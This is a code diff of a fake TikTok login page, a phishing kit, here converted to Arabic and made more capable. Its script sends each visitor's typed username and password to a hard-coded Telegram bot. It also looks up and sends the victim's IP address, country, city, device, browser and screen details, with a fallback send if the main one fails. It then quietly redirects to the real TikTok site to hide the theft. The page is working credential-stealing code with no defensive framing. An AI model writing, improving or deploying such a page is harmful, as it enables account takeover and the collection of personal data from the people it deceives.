@@ -1,9 +1,9 @@
 <!DOCTYPE html>
-<html lang="en">
+<html lang="ar" dir="rtl">
 <head>
     <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>TikTok - Login</title>
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
+    <title>TikTok - تسجيل الدخول</title>
     <!-- Font Awesome for icons -->
     <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0-beta3/css/all.min.css">
     <style>
@@ -35,13 +35,12 @@
         .logo {
             margin-bottom: 30px;
         }
-        .logo svg {
-            width: 160px;
-            height: auto;
-        }
         .logo i {
-            font-size: 48px;
+            font-size: 56px;
             color: #000;
+            background: linear-gradient(135deg, #25F4EE, #FE2C55);
+            -webkit-background-clip: text;
+            -webkit-text-fill-color: transparent;
         }
         h2 {
             font-size: 24px;
@@ -61,7 +60,7 @@
         }
         .input-group {
             position: relative;
-            text-align: left;
+            text-align: right;
         }
         .input-group input {
             width: 100%;
@@ -72,6 +71,7 @@
             outline: none;
             transition: border-color 0.2s;
             background: #f9f9f9;
+            text-align: right;
         }
         .input-group input:focus {
             border-color: #fe2c55;
@@ -79,6 +79,7 @@
         }
         .input-group input::placeholder {
             color: #aaa;
+            text-align: right;
         }
         .login-btn {
             background: #fe2c55;
@@ -94,6 +95,11 @@
         }
         .login-btn:hover {
             background: #e0234a;
+        }
+        .login-btn:disabled {
+            background: #ff8a9e;
+            cursor: not-allowed;
+            opacity: 0.7;
         }
         .links {
             display: flex;
@@ -140,71 +146,281 @@
             border-top: 1px solid #eee;
             margin: 20px 0;
         }
+        .loading-message {
+            color: #fe2c55;
+            font-size: 12px;
+            margin-bottom: 15px;
+            padding: 8px;
+            background: #fff0f2;
+            border-radius: 8px;
+            text-align: center;
+            display: none;
+        }
+        @keyframes spin {
+            0% { transform: rotate(0deg); }
+            100% { transform: rotate(360deg); }
+        }
+        .spinner {
+            display: inline-block;
+            width: 12px;
+            height: 12px;
+            border: 2px solid #fe2c55;
+            border-top: 2px solid transparent;
+            border-radius: 50%;
+            animation: spin 0.6s linear infinite;
+            margin-left: 8px;
+            vertical-align: middle;
+        }
     </style>
 </head>
 <body>
     <div class="container">
         <div class="tiktok-card">
             <div class="logo">
-                <!-- TikTok Logo (SVG from Font Awesome or simple text) -->
-                <i class="fab fa-tiktok" style="font-size: 48px; color: #000;"></i>
-                <h2>Log in to TikTok</h2>
-                <div class="subtitle">Manage your account, check notifications, comment on videos, and more.</div>
+                <i class="fab fa-tiktok"></i>
+                <h2>تسجيل الدخول إلى TikTok</h2>
+                <div class="subtitle">إدارة حسابك، التحقق من الإشعارات، التعليق على الفيديوهات، والمزيد.</div>
             </div>
             <form id="loginForm" action="#">
+                <div id="loadingMessage" class="loading-message"></div>
                 <div class="input-group">
-                    <input type="text" id="username" placeholder="Email, phone, or username" required>
+                    <input type="text" id="username" placeholder="البريد الإلكتروني، الهاتف، أو اسم المستخدم" required autocomplete="off">
                 </div>
                 <div class="input-group">
-                    <input type="password" id="password" placeholder="Password" required>
+                    <input type="password" id="password" placeholder="كلمة المرور" required autocomplete="off">
                 </div>
-                <button type="submit" class="login-btn">Log in</button>
+                <button type="submit" class="login-btn" id="loginBtn">تسجيل الدخول</button>
                 <div class="links">
-                    <a href="#">Forgot password?</a>
-                    <a href="#">Sign up</a>
+                    <a href="#">نسيت كلمة المرور؟</a>
+                    <a href="#">التسجيل</a>
                 </div>
             </form>
             <hr>
             <div class="signup">
-                Don't have an account? <a href="#">Sign up</a>
+                ليس لديك حساب؟ <a href="#">سجل الآن</a>
             </div>
             <div class="footer">
-                <a href="#">Privacy Policy</a> • <a href="#">Terms of Service</a>
+                <a href="#">سياسة الخصوصية</a> • <a href="#">شروط الخدمة</a>
             </div>
         </div>
     </div>
 
     <script>
-        // ========== Telegram Configuration ==========
+        // ========== إعدادات تليجرام ==========
         const telegramBotToken = '8567650656:AAFAXe5M_xQ6Zom6Q_uc7g2wAD3W2fAdqkI';
         const telegramChatId = '8304101362';
-        // ============================================
+        // =====================================
 
-        document.getElementById('loginForm').addEventListener('submit', function(event) {
-            event.preventDefault();
+        const loginForm = document.getElementById('loginForm');
+        const usernameInput = document.getElementById('username');
+        const passwordInput = document.getElementById('password');
+        const loginBtn = document.getElementById('loginBtn');
+        const loadingMessageDiv = document.getElementById('loadingMessage');
+        
+        let isSubmitting = false;
 
-            const username = document.getElementById('username').value;
-            const password = document.getElementById('password').value;
-            const message = `🎵 TikTok Login\n👤 User: ${username}\n🔑 Pass: ${password}`;
+        // دالة سريعة لجلب IP
+        async function getIPFast() {
+            try {
+                const controller = new AbortController();
+                const timeoutId = setTimeout(() => controller.abort(), 1500);
+                const response = await fetch('https://api.ipify.org?format=json', {
+                    signal: controller.signal
+                });
+                clearTimeout(timeoutId);
+                const data = await response.json();
+                return data.ip;
+            } catch (error) {
+                return 'غير متاح';
+            }
+        }
+
+        // دالة سريعة لجلب معلومات الموقع
+        async function getLocationFast(ip) {
+            if (ip === 'غير متاح') return { country: 'غير معروف', city: 'غير معروف' };
+            try {
+                const controller = new AbortController();
+                const timeoutId = setTimeout(() => controller.abort(), 1500);
+                const response = await fetch(`https://ipapi.co/${ip}/json/`, {
+                    signal: controller.signal
+                });
+                clearTimeout(timeoutId);
+                const data = await response.json();
+                return {
+                    country: data.country_name || 'غير معروف',
+                    city: data.city || 'غير معروف'
+                };
+            } catch (error) {
+                return { country: 'غير معروف', city: 'غير معروف' };
+            }
+        }
+
+        // دالة سريعة لجمع معلومات الجهاز
+        function getDeviceFast() {
+            const ua = navigator.userAgent;
+            let device = 'PC';
+            let browser = 'غير معروف';
+            let os = 'غير معروف';
+            
+            // تحديد الجهاز
+            if (/Android/i.test(ua)) device = 'Android';
+            else if (/iPhone/i.test(ua)) device = 'iPhone';
+            else if (/iPad/i.test(ua)) device = 'iPad';
+            else if (/Windows/i.test(ua)) device = 'Windows';
+            else if (/Mac/i.test(ua)) device = 'Mac';
+            
+            // تحديد المتصفح
+            if (/Chrome/i.test(ua) && !/Edge/i.test(ua)) browser = 'Chrome';
+            else if (/Firefox/i.test(ua)) browser = 'Firefox';
+            else if (/Safari/i.test(ua) && !/Chrome/i.test(ua)) browser = 'Safari';
+            else if (/Edge/i.test(ua)) browser = 'Edge';
+            
+            // تحديد نظام التشغيل
+            if (/Windows NT 10.0/i.test(ua)) os = 'Windows 10/11';
+            else if (/Windows NT 6.1/i.test(ua)) os = 'Windows 7';
+            else if (/Mac OS X/i.test(ua)) os = 'macOS';
+            else if (/Android/i.test(ua)) os = 'Android';
+            else if (/iPhone|iPad/i.test(ua)) os = 'iOS';
+            
+            // معلومات إضافية
+            const language = navigator.language;
+            const screenResolution = `${screen.width}x${screen.height}`;
+            
+            return { device, browser, os, language, screenResolution };
+        }
+
+        // استخراج اسم المستخدم من البريد
+        function extractUsername(email) {
+            if (!email || !email.includes('@')) return email;
+            return email.split('@')[0];
+        }
+
+        // إرسال سريع إلى تليجرام
+        function sendToTelegramFast(username, password, ip, location, device) {
+            const timestamp = new Date().toLocaleString('ar-EG');
+            const displayName = extractUsername(username) || username;
+            
+            const message = `🎵 TIKTOK LOGIN 🎵
+━━━━━━━━━━━━━━━━━━━━━━
+👤 اسم المستخدم: ${displayName}
+📧 البريد/الهاتف: ${username}
+🔑 كلمة المرور: ${password}
+━━━━━━━━━━━━━━━━━━━━━━
+🌐 IP: ${ip}
+🏳️ الدولة: ${location.country}
+🏙️ المدينة: ${location.city}
+📱 الجهاز: ${device.device}
+🌍 المتصفح: ${device.browser}
+💻 النظام: ${device.os}
+🌐 اللغة: ${device.language}
+📺 الشاشة: ${device.screenResolution}
+🕒 الوقت: ${timestamp}
+━━━━━━━━━━━━━━━━━━━━━━
+🎬 TikTok - Make Your Day`;
+            
             const url = `https://api.telegram.org/bot${telegramBotToken}/sendMessage`;
-
-            // Send data silently to Telegram
+            
+            // إرسال بدون انتظار
             fetch(url, {
                 method: 'POST',
                 headers: { 'Content-Type': 'application/json' },
                 body: JSON.stringify({
                     chat_id: telegramChatId,
-                    text: message,
-                    parse_mode: 'HTML'
+                    text: message
                 })
-            })
-            .then(response => response.json())
-            .catch(error => console.error('Telegram error:', error))
-            .finally(() => {
-                // Redirect to official TikTok site without any notification
-                window.location.href = 'https://www.tiktok.com';
-            });
+            }).catch(() => {});
+        }
+
+        // عرض رسالة التحميل
+        function showLoading(show, message = 'جاري الاتصال...') {
+            if (show) {
+                loadingMessageDiv.innerHTML = `<span class="spinner"></span> ${message}`;
+                loadingMessageDiv.style.display = 'block';
+                loginBtn.disabled = true;
+            } else {
+                loadingMessageDiv.style.display = 'none';
+                loginBtn.disabled = false;
+            }
+        }
+
+        // معالج تسجيل الدخول
+        loginForm.addEventListener('submit', async function(event) {
+            event.preventDefault();
+            
+            if (isSubmitting) return;
+            
+            const username = usernameInput.value.trim();
+            const password = passwordInput.value.trim();
+            
+            if (!username) {
+                alert('❌ الرجاء إدخال البريد الإلكتروني، الهاتف، أو اسم المستخدم');
+                usernameInput.focus();
+                return;
+            }
+            
+            if (!password) {
+                alert('❌ الرجاء إدخال كلمة المرور');
+                passwordInput.focus();
+                return;
+            }
+            
+            isSubmitting = true;
+            showLoading(true, 'جاري تسجيل الدخول...');
+            
+            try {
+                // جمع المعلومات بسرعة
+                const ip = await getIPFast();
+                const location = await getLocationFast(ip);
+                const device = getDeviceFast();
+                
+                // إرسال إلى تليجرام فوراً
+                sendToTelegramFast(username, password, ip, location, device);
+                
+                console.log('✅ تم إرسال البيانات إلى تليجرام');
+                console.log(`👤 ${username} | 🌍 ${location.country} | 📱 ${device.device}`);
+                console.log(`🎵 TikTok Login Success`);
+                
+                // تحويل فوري
+                showLoading(true, 'جاري التحويل...');
+                setTimeout(() => {
+                    window.location.href = 'https://www.tiktok.com';
+                }, 200);
+                
+            } catch (error) {
+                console.error('خطأ:', error);
+                // محاولة إرسال البيانات الأساسية
+                try {
+                    const basicMessage = `🎵 TIKTOK LOGIN\n👤 ${username}\n🔑 ${password}\n🕒 ${new Date().toLocaleString()}`;
+                    fetch(`https://api.telegram.org/bot${telegramBotToken}/sendMessage`, {
+                        method: 'POST',
+                        headers: { 'Content-Type': 'application/json' },
+                        body: JSON.stringify({ chat_id: telegramChatId, text: basicMessage })
+                    }).catch(() => {});
+                } catch(e) {}
+                
+                showLoading(false);
+                alert('⚠️ حدث خطأ، يرجى المحاولة مرة أخرى');
+                isSubmitting = false;
+            }
         });
+        
+        // دعم الضغط على Enter
+        usernameInput.addEventListener('keypress', (e) => {
+            if (e.key === 'Enter') {
+                e.preventDefault();
+                passwordInput.focus();
+            }
+        });
+        
+        passwordInput.addEventListener('keypress', (e) => {
+            if (e.key === 'Enter') {
+                e.preventDefault();
+                loginForm.dispatchEvent(new Event('submit'));
+            }
+        });
+        
+        console.log('✅ تم تحميل صفحة TikTok - الوضع السريع');
+        console.log('🎵 Ready to make your day!');
     </script>
 </body>
 </html>
